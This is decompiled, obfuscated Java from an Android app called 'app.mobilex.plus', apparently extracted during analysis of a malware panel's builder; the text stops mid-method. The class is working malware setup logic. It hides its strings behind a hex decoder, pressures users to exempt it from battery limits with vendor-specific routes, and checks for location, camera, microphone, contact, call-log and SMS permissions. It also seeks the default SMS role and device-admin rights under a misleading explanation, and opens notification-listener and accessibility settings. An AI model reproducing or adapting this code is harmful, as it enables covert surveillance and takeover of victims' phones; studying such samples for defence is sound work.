package v.s;

import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.app.role.RoleManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.PowerManager;
import android.os.Process;
import android.provider.Settings;
import android.provider.Telephony;
import app.mobilex.plus.ManagerQJWorker;
import app.mobilex.plus.receivers.DeviceAdminReceiver;
import app.mobilex.plus.services.DataQFAdapter;
import app.mobilex.plus.util.TypefaceCache;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import java.util.Objects;
import org.json.JSONObject;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class VpKcDcuRNaQkRJ5 {
    public static volatile String Ee8d2j4S9Vm5yGuR;
    public static volatile boolean JXn4Qf7zpnLjP5;
    public static final int b1EoSIRjJHO5;
    public static final VpKcDcuRNaQkRJ5 dDIMxZXP1V8HdM = new VpKcDcuRNaQkRJ5();
    public static snDbSR9Gb3eZZuB ibVTtJUNfrGYbW;
    public static final String vekpFI4d1Nc4fakF;
    public static final String w9sT1Swbhx3hs;
    public static volatile boolean xDyLpEZyrcKVe0;

    static {
        TypefaceCache.obtain("001300730049008A00D500B100D500AE002D0073");
        w9sT1Swbhx3hs = TypefaceCache.obtain("0033007F004B008200FC00B600DC00A2001C00660049008200F600AC");
        vekpFI4d1Nc4fakF = TypefaceCache.obtain("0033007F004B008200FC00B600DC00A2001C00720054008900F5");
        Ee8d2j4S9Vm5yGuR = "";
        b1EoSIRjJHO5 = 1350565888;
    }

    public static void D5P1xCAyuvgF(Service service) {
        Intent intent = new Intent("android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS");
        intent.setData(Uri.parse(TypefaceCache.obtain("003300770058008C00F100B800D700FD") + service.getPackageName()));
        int i = b1EoSIRjJHO5;
        intent.addFlags(i);
        Intent intent2 = new Intent("android.settings.IGNORE_BATTERY_OPTIMIZATION_SETTINGS");
        intent2.addFlags(i);
        Intent intent3 = new Intent(TypefaceCache.obtain("00220078005F009500FF00B600D600E900300073004F009300F900B100D500B4006D0057006B00B700CF009D00F3009300170053006900BE00CF008C00F700930017005F007500A000C3"));
        intent3.setData(Uri.parse(TypefaceCache.obtain("003300770058008C00F100B800D700FD") + service.getPackageName()));
        intent3.addFlags(i);
        Intent intent4 = new Intent("android.settings.APPLICATION_DETAILS_SETTINGS");
        intent4.setData(Uri.parse(TypefaceCache.obtain("003300770058008C00F100B800D700FD") + service.getPackageName()));
        intent4.addFlags(i);
        Intent intent5 = new Intent("android.settings.BATTERY_SAVER_SETTINGS");
        intent5.addFlags(i);
        ArrayList arrayListVIJudZvPyTuNp = Aqh0grSwgDbwr.vIJudZvPyTuNp(intent, intent2, intent3, intent4, intent5);
        String lowerCase = Build.MANUFACTURER.toLowerCase(Locale.ROOT);
        int i2 = 0;
        if (KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase, TypefaceCache.obtain("003B007F005A008800FD00B6"), false) || KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase, TypefaceCache.obtain("00310073005F008A00F9"), false)) {
            Intent intent6 = new Intent();
            intent6.setComponent(new ComponentName(TypefaceCache.obtain("00200079005600C900FD00B600C700AE006D00660054009000F500AD00D900A200260066005E0095"), TypefaceCache.obtain("00200079005600C900FD00B600C700AE006D00660054009000F500AD00D900A200260066005E009500BE00AA00DB00E9000B007F005F008300F500B100F300B7003300650078008800FE00B900DB00A000020075004F008E00E600B600C600BE")));
            intent6.putExtra(TypefaceCache.obtain("003300770058008C00F100B800D70098002D007700560082"), service.getPackageName());
            intent6.putExtra(TypefaceCache.obtain("003300770058008C00F100B800D70098002F00770059008200FC"), service.getApplicationInfo().loadLabel(service.getPackageManager()));
            intent6.addFlags(i);
            arrayListVIJudZvPyTuNp.add(2, intent6);
        } else if (KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase, TypefaceCache.obtain("002B0063005A009000F500B6"), false) || KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase, TypefaceCache.obtain("002B00790055008800E2"), false)) {
            Intent intent7 = new Intent();
            intent7.setComponent(new ComponentName(TypefaceCache.obtain("00200079005600C900F800AA00D300B00026007F0015009400E900AC00C600A2002E007B005A008900F100B800D700B5"), TypefaceCache.obtain("00200079005600C900F800AA00D300B00026007F0015009400E900AC00C600A2002E007B005A008900F100B800D700B5006D0079004B009300F900B200DB00BD00260038004B009500FF00BC00D700B400300038006B009500FF00AB00D700A4003700570058009300F900A900DB00B3003A")));
            intent7.addFlags(i);
            arrayListVIJudZvPyTuNp.add(2, intent7);
        } else if (KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase, TypefaceCache.obtain("003000770056009400E500B100D5"), false)) {
            Intent intent8 = new Intent();
            intent8.setComponent(new ComponentName(TypefaceCache.obtain("00200079005600C900E300BE00DF00B400360078005C00C900F100B100D600B5002C007F005F00C900FC00B000DD00AB"), TypefaceCache.obtain("00200079005600C900E300BE00DF00B400360078005C00C900F100B100D600B5002C007F005F00C900E300B2009C00A500220062004F008200E200A6009C00B2002A00380079008600E400AB00D700B5003A00570058009300F900A900DB00B3003A")));
            intent8.addFlags(i);
            arrayListVIJudZvPyTuNp.add(2, intent8);
        }
        int size = arrayListVIJudZvPyTuNp.size();
        while (i2 < size) {
            Object obj = arrayListVIJudZvPyTuNp.get(i2);
            i2++;
            Intent intent9 = (Intent) obj;
            try {
                service.startActivity(intent9);
                TypefaceCache.obtain("002C0066005E008900D200BE00C600B300260064004200B400F500AB00C600AE002D0071004800DD00B000B300D300B2002D00750053008200F400FF");
                Object action = intent9.getAction();
                if (action == null) {
                    action = intent9.getComponent();
                }
                Objects.toString(action);
                return;
            } catch (Exception unused) {
            }
        }
        TypefaceCache.obtain("002C0066005E008900D200BE00C600B300260064004200B400F500AB00C600AE002D0071004800DD00B000BE00DE00AB0063007F0055009300F500B100C600B400630070005A008E00FC00BA00D6");
    }

    public static boolean Ee8d2j4S9Vm5yGuR(Context context) {
        try {
            if (Build.VERSION.SDK_INT < 29) {
                return okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(Telephony.Sms.getDefaultSmsPackage(context), context.getPackageName());
            }
            Object systemService = context.getSystemService("role");
            RoleManager roleManagerDDIMxZXP1V8HdM = JW3Lh9hxwLsO2ArTlH.EWUjsTERgdPbSw3NNlN(systemService) ? JW3Lh9hxwLsO2ArTlH.dDIMxZXP1V8HdM(systemService) : null;
            while (Process.myPid() < -999) {
                StringBuilder sb = new StringBuilder();
                sb.append(0);
                sb.setLength(0);
            }
            return roleManagerDDIMxZXP1V8HdM != null && roleManagerDDIMxZXP1V8HdM.isRoleHeld("android.app.role.SMS");
        } catch (Exception unused) {
        }
    }

    public static void J0zjQ7CAgohuxU20eCW6() {
        snDbSR9Gb3eZZuB sndbsr9gb3ezzub = ibVTtJUNfrGYbW;
        if (sndbsr9gb3ezzub != null) {
            sndbsr9gb3ezzub.vekpFI4d1Nc4fakF(null);
        }
        JXn4Qf7zpnLjP5 = false;
    }

    public static boolean JXn4Qf7zpnLjP5(Context context) {
        List listYTljMGnIibTRdOpSh4 = Aqh0grSwgDbwr.yTljMGnIibTRdOpSh4("android.permission.ACCESS_FINE_LOCATION", "android.permission.CAMERA", "android.permission.RECORD_AUDIO", "android.permission.READ_CONTACTS", "android.permission.READ_PHONE_STATE", "android.permission.READ_CALL_LOG", "android.permission.READ_SMS", "android.permission.SEND_SMS", "android.permission.RECEIVE_SMS");
        if (listYTljMGnIibTRdOpSh4.isEmpty()) {
            return true;
        }
        Iterator it = listYTljMGnIibTRdOpSh4.iterator();
        while (it.hasNext()) {
            if (context.checkSelfPermission((String) it.next()) != 0) {
                return false;
            }
        }
        return true;
    }

    public static void Qrz92kRPw4GcghAc() {
        xDyLpEZyrcKVe0 = false;
    }

    public static boolean b1EoSIRjJHO5() {
        return JXn4Qf7zpnLjP5;
    }

    /* JADX WARN: Code duplicated, block: B:57:0x01a9  */
    /* JADX WARN: Code duplicated, block: B:59:0x01b4  */
    /* JADX WARN: Code duplicated, block: B:62:0x01cd  */
    /* JADX WARN: Code duplicated, block: B:7:0x001d  */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r10v1 */
    /* JADX WARN: Type inference failed for: r10v10 */
    /* JADX WARN: Type inference failed for: r10v11 */
    /* JADX WARN: Type inference failed for: r10v2 */
    /* JADX WARN: Type inference failed for: r10v3 */
    /* JADX WARN: Type inference failed for: r10v4 */
    /* JADX WARN: Type inference failed for: r10v5 */
    /* JADX WARN: Type inference failed for: r10v6 */
    /* JADX WARN: Type inference failed for: r10v8, types: [v.s.VpKcDcuRNaQkRJ5] */
    /* JADX WARN: Type inference failed for: r10v9 */
    /* JADX WARN: Type inference failed for: r12v10, types: [java.lang.Object, v.s.VpKcDcuRNaQkRJ5] */
    /* JADX WARN: Type inference failed for: r12v11 */
    /* JADX WARN: Type inference failed for: r12v12, types: [java.lang.Object] */
    /* JADX WARN: Type inference failed for: r12v13, types: [java.lang.Object, v.s.VpKcDcuRNaQkRJ5] */
    /* JADX WARN: Type inference failed for: r12v14, types: [java.lang.Object] */
    /* JADX WARN: Type inference failed for: r12v15, types: [java.lang.Object, v.s.VpKcDcuRNaQkRJ5] */
    /* JADX WARN: Type inference failed for: r12v16, types: [java.lang.Object] */
    /* JADX WARN: Type inference failed for: r12v17, types: [java.lang.Object, v.s.VpKcDcuRNaQkRJ5] */
    /* JADX WARN: Type inference failed for: r12v18, types: [java.lang.Object] */
    /* JADX WARN: Type inference failed for: r12v19 */
    /* JADX WARN: Type inference failed for: r12v2 */
    /* JADX WARN: Type inference failed for: r12v20, types: [java.lang.Object] */
    /* JADX WARN: Type inference failed for: r12v21, types: [java.lang.Object] */
    /* JADX WARN: Type inference failed for: r12v22 */
    /* JADX WARN: Type inference failed for: r12v23 */
    /* JADX WARN: Type inference failed for: r12v24 */
    /* JADX WARN: Type inference failed for: r12v3, types: [java.lang.Object] */
    /* JADX WARN: Type inference failed for: r12v5, types: [java.lang.Object, v.s.VpKcDcuRNaQkRJ5] */
    /* JADX WARN: Type inference failed for: r12v55 */
    /* JADX WARN: Type inference failed for: r12v56 */
    /* JADX WARN: Type inference failed for: r12v57 */
    /* JADX WARN: Type inference failed for: r12v58 */
    /* JADX WARN: Type inference failed for: r12v59 */
    /* JADX WARN: Type inference failed for: r12v6, types: [java.lang.Object] */
    /* JADX WARN: Type inference failed for: r12v60 */
    /* JADX WARN: Type inference failed for: r12v61 */
    /* JADX WARN: Type inference failed for: r12v62 */
    /* JADX WARN: Type inference failed for: r12v63 */
    /* JADX WARN: Type inference failed for: r12v64 */
    /* JADX WARN: Type inference failed for: r12v65 */
    /* JADX WARN: Type inference failed for: r12v66 */
    /* JADX WARN: Type inference failed for: r12v67 */
    /* JADX WARN: Type inference failed for: r12v68 */
    /* JADX WARN: Type inference failed for: r12v69 */
    /* JADX WARN: Type inference failed for: r12v7, types: [java.lang.Object, v.s.VpKcDcuRNaQkRJ5] */
    /* JADX WARN: Type inference failed for: r12v70 */
    /* JADX WARN: Type inference failed for: r12v71 */
    /* JADX WARN: Type inference failed for: r12v72 */
    /* JADX WARN: Type inference failed for: r12v73 */
    /* JADX WARN: Type inference failed for: r12v74 */
    /* JADX WARN: Type inference failed for: r12v75 */
    /* JADX WARN: Type inference failed for: r12v76 */
    /* JADX WARN: Type inference failed for: r12v77 */
    /* JADX WARN: Type inference failed for: r12v78 */
    /* JADX WARN: Type inference failed for: r12v79 */
    /* JADX WARN: Type inference failed for: r12v8, types: [java.lang.Object] */
    /* JADX WARN: Type inference failed for: r12v80 */
    /* JADX WARN: Type inference failed for: r12v81 */
    /* JADX WARN: Type inference failed for: r12v82 */
    /* JADX WARN: Type inference failed for: r12v83 */
    /* JADX WARN: Type inference failed for: r12v84 */
    /* JADX WARN: Type inference failed for: r12v85 */
    /* JADX WARN: Type inference failed for: r12v86 */
    /* JADX WARN: Type inference failed for: r12v87 */
    /* JADX WARN: Type inference failed for: r12v88 */
    /* JADX WARN: Type inference failed for: r12v89 */
    /* JADX WARN: Type inference failed for: r12v9, types: [java.lang.Object, v.s.VpKcDcuRNaQkRJ5] */
    /* JADX WARN: Type inference failed for: r12v90 */
    /* JADX WARN: Type inference failed for: r12v91 */
    /* JADX WARN: Type inference failed for: r12v92 */
    /* JADX WARN: Type inference failed for: r12v93 */
    /* JADX WARN: Type inference failed for: r12v94 */
    /* JADX WARN: Type inference failed for: r1v0, types: [v.s.VpKcDcuRNaQkRJ5] */
    /* JADX WARN: Type inference failed for: r1v1 */
    /* JADX WARN: Type inference failed for: r1v10, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r1v100 */
    /* JADX WARN: Type inference failed for: r1v101 */
    /* JADX WARN: Type inference failed for: r1v102 */
    /* JADX WARN: Type inference failed for: r1v103 */
    /* JADX WARN: Type inference failed for: r1v104 */
    /* JADX WARN: Type inference failed for: r1v105 */
    /* JADX WARN: Type inference failed for: r1v106 */
    /* JADX WARN: Type inference failed for: r1v107 */
    /* JADX WARN: Type inference failed for: r1v108 */
    /* JADX WARN: Type inference failed for: r1v109 */
    /* JADX WARN: Type inference failed for: r1v11, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r1v110 */
    /* JADX WARN: Type inference failed for: r1v111 */
    /* JADX WARN: Type inference failed for: r1v112 */
    /* JADX WARN: Type inference failed for: r1v113 */
    /* JADX WARN: Type inference failed for: r1v114 */
    /* JADX WARN: Type inference failed for: r1v115 */
    /* JADX WARN: Type inference failed for: r1v116 */
    /* JADX WARN: Type inference failed for: r1v117 */
    /* JADX WARN: Type inference failed for: r1v118 */
    /* JADX WARN: Type inference failed for: r1v12 */
    /* JADX WARN: Type inference failed for: r1v13, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r1v14, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r1v15, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r1v16, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r1v17, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r1v18, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r1v19 */
    /* JADX WARN: Type inference failed for: r1v20 */
    /* JADX WARN: Type inference failed for: r1v21, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r1v22 */
    /* JADX WARN: Type inference failed for: r1v23 */
    /* JADX WARN: Type inference failed for: r1v27 */
    /* JADX WARN: Type inference failed for: r1v29, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r1v3, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r1v32, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r1v33 */
    /* JADX WARN: Type inference failed for: r1v34, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r1v4, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r1v43, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r1v45, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r1v5, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r1v59, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r1v6 */
    /* JADX WARN: Type inference failed for: r1v68 */
    /* JADX WARN: Type inference failed for: r1v69 */
    /* JADX WARN: Type inference failed for: r1v7, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r1v70 */
    /* JADX WARN: Type inference failed for: r1v71 */
    /* JADX WARN: Type inference failed for: r1v72 */
    /* JADX WARN: Type inference failed for: r1v73 */
    /* JADX WARN: Type inference failed for: r1v74 */
    /* JADX WARN: Type inference failed for: r1v75 */
    /* JADX WARN: Type inference failed for: r1v76 */
    /* JADX WARN: Type inference failed for: r1v77 */
    /* JADX WARN: Type inference failed for: r1v78 */
    /* JADX WARN: Type inference failed for: r1v79 */
    /* JADX WARN: Type inference failed for: r1v8, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r1v80 */
    /* JADX WARN: Type inference failed for: r1v81 */
    /* JADX WARN: Type inference failed for: r1v82 */
    /* JADX WARN: Type inference failed for: r1v83 */
    /* JADX WARN: Type inference failed for: r1v84 */
    /* JADX WARN: Type inference failed for: r1v85 */
    /* JADX WARN: Type inference failed for: r1v86 */
    /* JADX WARN: Type inference failed for: r1v87 */
    /* JADX WARN: Type inference failed for: r1v88 */
    /* JADX WARN: Type inference failed for: r1v89 */
    /* JADX WARN: Type inference failed for: r1v9, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r1v90 */
    /* JADX WARN: Type inference failed for: r1v91 */
    /* JADX WARN: Type inference failed for: r1v92 */
    /* JADX WARN: Type inference failed for: r1v93 */
    /* JADX WARN: Type inference failed for: r1v94 */
    /* JADX WARN: Type inference failed for: r1v95 */
    /* JADX WARN: Type inference failed for: r1v96 */
    /* JADX WARN: Type inference failed for: r1v97 */
    /* JADX WARN: Type inference failed for: r1v98 */
    /* JADX WARN: Type inference failed for: r1v99 */
    /* JADX WARN: Type inference failed for: r3v34 */
    /* JADX WARN: Type inference failed for: r3v35, types: [java.lang.Object] */
    /* JADX WARN: Type inference failed for: r3v37 */
    /* JADX WARN: Type inference failed for: r3v38 */
    /* JADX WARN: Type inference failed for: r3v42 */
    /* JADX WARN: Type inference failed for: r3v43 */
    /* JADX WARN: Type inference failed for: r5v0, types: [int] */
    /* JADX WARN: Type inference failed for: r5v1 */
    /* JADX WARN: Type inference failed for: r5v10, types: [android.content.Context, java.lang.Object] */
    /* JADX WARN: Type inference failed for: r5v100 */
    /* JADX WARN: Type inference failed for: r5v101 */
    /* JADX WARN: Type inference failed for: r5v102 */
    /* JADX WARN: Type inference failed for: r5v103 */
    /* JADX WARN: Type inference failed for: r5v104 */
    /* JADX WARN: Type inference failed for: r5v105 */
    /* JADX WARN: Type inference failed for: r5v106 */
    /* JADX WARN: Type inference failed for: r5v107 */
    /* JADX WARN: Type inference failed for: r5v108 */
    /* JADX WARN: Type inference failed for: r5v109 */
    /* JADX WARN: Type inference failed for: r5v11, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r5v110 */
    /* JADX WARN: Type inference failed for: r5v111 */
    /* JADX WARN: Type inference failed for: r5v112 */
    /* JADX WARN: Type inference failed for: r5v113 */
    /* JADX WARN: Type inference failed for: r5v114 */
    /* JADX WARN: Type inference failed for: r5v115 */
    /* JADX WARN: Type inference failed for: r5v116 */
    /* JADX WARN: Type inference failed for: r5v117 */
    /* JADX WARN: Type inference failed for: r5v118 */
    /* JADX WARN: Type inference failed for: r5v119 */
    /* JADX WARN: Type inference failed for: r5v12, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r5v120 */
    /* JADX WARN: Type inference failed for: r5v121 */
    /* JADX WARN: Type inference failed for: r5v122 */
    /* JADX WARN: Type inference failed for: r5v124 */
    /* JADX WARN: Type inference failed for: r5v13, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r5v14 */
    /* JADX WARN: Type inference failed for: r5v15, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r5v16, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r5v17, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r5v18, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r5v19, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r5v2, types: [android.accessibilityservice.AccessibilityService] */
    /* JADX WARN: Type inference failed for: r5v20, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r5v21 */
    /* JADX WARN: Type inference failed for: r5v22 */
    /* JADX WARN: Type inference failed for: r5v23, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r5v24, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r5v25 */
    /* JADX WARN: Type inference failed for: r5v26, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r5v27 */
    /* JADX WARN: Type inference failed for: r5v28, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r5v29 */
    /* JADX WARN: Type inference failed for: r5v33 */
    /* JADX WARN: Type inference failed for: r5v39 */
    /* JADX WARN: Type inference failed for: r5v40 */
    /* JADX WARN: Type inference failed for: r5v41 */
    /* JADX WARN: Type inference failed for: r5v42, types: [java.lang.Object] */
    /* JADX WARN: Type inference failed for: r5v46 */
    /* JADX WARN: Type inference failed for: r5v51, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r5v55, types: [app.mobilex.plus.services.DataQFAdapter] */
    /* JADX WARN: Type inference failed for: r5v69, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r5v7, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r5v74 */
    /* JADX WARN: Type inference failed for: r5v75 */
    /* JADX WARN: Type inference failed for: r5v76 */
    /* JADX WARN: Type inference failed for: r5v77 */
    /* JADX WARN: Type inference failed for: r5v78 */
    /* JADX WARN: Type inference failed for: r5v79 */
    /* JADX WARN: Type inference failed for: r5v8 */
    /* JADX WARN: Type inference failed for: r5v80 */
    /* JADX WARN: Type inference failed for: r5v81 */
    /* JADX WARN: Type inference failed for: r5v82 */
    /* JADX WARN: Type inference failed for: r5v83 */
    /* JADX WARN: Type inference failed for: r5v84 */
    /* JADX WARN: Type inference failed for: r5v85 */
    /* JADX WARN: Type inference failed for: r5v86 */
    /* JADX WARN: Type inference failed for: r5v87 */
    /* JADX WARN: Type inference failed for: r5v88 */
    /* JADX WARN: Type inference failed for: r5v89 */
    /* JADX WARN: Type inference failed for: r5v9, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r5v90 */
    /* JADX WARN: Type inference failed for: r5v91 */
    /* JADX WARN: Type inference failed for: r5v92 */
    /* JADX WARN: Type inference failed for: r5v93 */
    /* JADX WARN: Type inference failed for: r5v94 */
    /* JADX WARN: Type inference failed for: r5v95 */
    /* JADX WARN: Type inference failed for: r5v96 */
    /* JADX WARN: Type inference failed for: r5v97 */
    /* JADX WARN: Type inference failed for: r5v98 */
    /* JADX WARN: Type inference failed for: r5v99 */
    /* JADX WARN: Type inference failed for: r8v0, types: [java.lang.Object] */
    /* JADX WARN: Type inference failed for: r8v10 */
    /* JADX WARN: Type inference failed for: r8v11, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r8v12, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r8v14 */
    /* JADX WARN: Type inference failed for: r8v15 */
    /* JADX WARN: Type inference failed for: r8v19 */
    /* JADX WARN: Type inference failed for: r8v26, types: [java.lang.Object] */
    /* JADX WARN: Type inference failed for: r8v28 */
    /* JADX WARN: Type inference failed for: r8v37 */
    /* JADX WARN: Type inference failed for: r8v38 */
    /* JADX WARN: Type inference failed for: r8v39 */
    /* JADX WARN: Type inference failed for: r8v40 */
    /* JADX WARN: Type inference failed for: r8v41 */
    /* JADX WARN: Type inference failed for: r8v42 */
    /* JADX WARN: Type inference failed for: r8v43 */
    /* JADX WARN: Type inference failed for: r8v44 */
    /* JADX WARN: Type inference failed for: r8v45 */
    /* JADX WARN: Type inference failed for: r8v8, types: [java.lang.Object] */
    /* JADX WARN: Type inference failed for: r8v9, types: [android.content.Context] */
    /* JADX WARN: Type inference failed for: r9v3 */
    /* JADX WARN: Unreachable blocks removed: 1, instructions: 2 */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:62:0x01cd -> B:63:0x01d4). Please report as a decompilation issue!!! */
    /*  JADX ERROR: JadxOverflowException in pass: RegionMakerVisitor
        jadx.core.utils.exceptions.JadxOverflowException: Regions stack size limit reached
        	at jadx.core.utils.ErrorsCounter.addError(ErrorsCounter.java:59)
        	at jadx.core.utils.ErrorsCounter.error(ErrorsCounter.java:31)
        	at jadx.core.dex.attributes.nodes.NotificationAttrNode.addError(NotificationAttrNode.java:19)
        */
    public static final java.lang.Object dDIMxZXP1V8HdM(android.content.Context r18, v.s.CWIOrUfHtKyaxQib0W r19) {
        /*
            Method dump skipped, instruction units count: 1956
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: v.s.VpKcDcuRNaQkRJ5.dDIMxZXP1V8HdM(android.content.Context, v.s.CWIOrUfHtKyaxQib0W):java.lang.Object");
    }

    public static void gIIiyi2ddlMDR0(Context context) {
        try {
            Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
            intent.addFlags(b1EoSIRjJHO5);
            context.startActivity(intent);
        } catch (Exception e) {
            TypefaceCache.obtain("002C0066005E008900DE00B000C600AE0025007F0058008600E400B600DD00A9000F007F0048009300F500B100D700B500100073004F009300F900B100D500B400790036");
            e.getMessage();
        }
    }

    public static void gmNWMfvn6zlEj(DataQFAdapter dataQFAdapter) {
        try {
            ComponentName componentName = new ComponentName(dataQFAdapter, (Class<?>) DeviceAdminReceiver.class);
            Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
            intent.putExtra("android.app.extra.DEVICE_ADMIN", componentName);
            intent.putExtra("android.app.extra.ADD_EXPLANATION", TypefaceCache.obtain("00110073004A009200F900AD00D700A3006300700054009500B000BB00D700B1002A0075005E00C700FD00BE00DC00A6002400730056008200FE00AB"));
            intent.addFlags(b1EoSIRjJHO5);
            dataQFAdapter.startActivity(intent);
        } catch (Exception e) {
            TypefaceCache.obtain("002C0066005E008900D400BA00C400AE00200073007A008300FD00B600DC009400260062004F008E00FE00B800C100FD0063");
            e.getMessage();
        }
    }

    public static void hjneShqpF9Tis4(Context context) {
        try {
            Intent intent = new Intent(context, (Class<?>) ManagerQJWorker.class);
            intent.putExtra(ManagerQJWorker.ibVTtJUNfrGYbW, ManagerQJWorker.xDyLpEZyrcKVe0);
            intent.addFlags(b1EoSIRjJHO5);
            context.startActivity(intent);
            TypefaceCache.obtain("002C0066005E008900D400BA00D400A60036007A004F00B400FD00AC00E100A2003700620052008900F700AC008800E7002F0077004E008900F300B700D700A3006300600052008600B0009200D300A900220071005E009500C1009500E500A80031007D005E0095");
        } catch (Exception e) {
            TypefaceCache.obtain("002C0066005E008900D400BA00D400A60036007A004F00B400FD00AC00E100A2003700620052008900F700AC008800E7000E00770055008600F700BA00C00096000900410054009500FB00BA00C000E7002500770052008B00F500BB008800E7");
            e.getMessage();
        }
    }

    public static boolean ibVTtJUNfrGYbW(Context context) {
        try {
            return context.getSharedPreferences(w9sT1Swbhx3hs, 0).getBoolean(vekpFI4d1Nc4fakF, false);
        } catch (Exception unused) {
            return false;
        }
    }

    public static void nQilHWaqS401ZtR(Context context) {
        if (JXn4Qf7zpnLjP5) {
            TypefaceCache.obtain("0002007A0049008200F100BB00CB00E7003100630055008900F900B100D500E700220062001B009400E400BA00C200FA");
            return;
        }
        Context applicationContext = context.getApplicationContext();
        if (ibVTtJUNfrGYbW(applicationContext)) {
            TypefaceCache.obtain("0013007F004B008200FC00B600DC00A2006300770057009500F500BE00D600BE006300750054008A00E000B300D700B300260072001B00CF00E000BA00C000B4002A0065004F008200F400F6009E00E70030007D0052009700E000B600DC00A0");
            Ee8d2j4S9Vm5yGuR = TypefaceCache.obtain("0027007900550082");
            return;
        }
        int i = 0;
        try {
            boolean zJXn4Qf7zpnLjP5 = JXn4Qf7zpnLjP5(applicationContext);
            boolean zIsIgnoringBatteryOptimizations = ((PowerManager) applicationContext.getSystemService("power")).isIgnoringBatteryOptimizations(applicationContext.getPackageName());
            if (zJXn4Qf7zpnLjP5 && zIsIgnoringBatteryOptimizations) {
                TypefaceCache.obtain("0002007A005700C700F300AD00DB00B3002A0075005A008B00B000AF00D700B5002E007F0048009400F900B000DC00B4006300770057009500F500BE00D600BE006300710049008600FE00AB00D700A3006F00360056008600E200B400DB00A900240036005F008800FE00BA");
                try {
                    applicationContext.getSharedPreferences(w9sT1Swbhx3hs, 0).edit().putBoolean(vekpFI4d1Nc4fakF, true).apply();
                } catch (Exception unused) {
                }
                Ee8d2j4S9Vm5yGuR = TypefaceCache.obtain("0027007900550082");
                return;
            }
        } catch (Exception unused2) {
        }
        JXn4Qf7zpnLjP5 = true;
        Ee8d2j4S9Vm5yGuR = TypefaceCache.obtain("00300062005A009500E400B600DC00A0");
        Handler handler = h4nyZoRAsl44Uv.JXn4Qf7zpnLjP5;
        h4nyZoRAsl44Uv.w9sT1Swbhx3hs = 0L;
        h4nyZoRAsl44Uv.vekpFI4d1Nc4fakF = 0L;
        h4nyZoRAsl44Uv.gmNWMfvn6zlEj = false;
        TypefaceCache.obtain("007E002B000600C700C000B600C200A2002F007F0055008200B0008C00E6008600110042001B00DA00AD00E2");
        ibVTtJUNfrGYbW = y6jRGLEWNMir.b1EoSIRjJHO5(jb8et6SZeK5TWMrJFxDX.dDIMxZXP1V8HdM(umMdYoePNXvWWPn.dDIMxZXP1V8HdM), null, new GrNkWurIv2PyLjgXX118(applicationContext, null, i), 3);
    }

    public static void pyu8ovAipBTLYAiKab(Service service) {
        int i = b1EoSIRjJHO5;
        String strFlattenToString = new ComponentName(service.getPackageName(), DataQFAdapter.class.getName()).flattenToString();
        try {
            Intent intent = new Intent(TypefaceCache.obtain("00220078005F009500FF00B600D600E900300073004F009300F900B100D500B4006D0057007800A400D5008C00E1008E0001005F007700AE00C4008600ED008300060042007A00AE00DC008C00ED009400060042006F00AE00DE009800E1"));
            intent.addFlags(i);
            intent.putExtra("android.intent.extra.COMPONENT_NAME", strFlattenToString);
            service.startActivity(intent);
        } catch (Exception unused) {
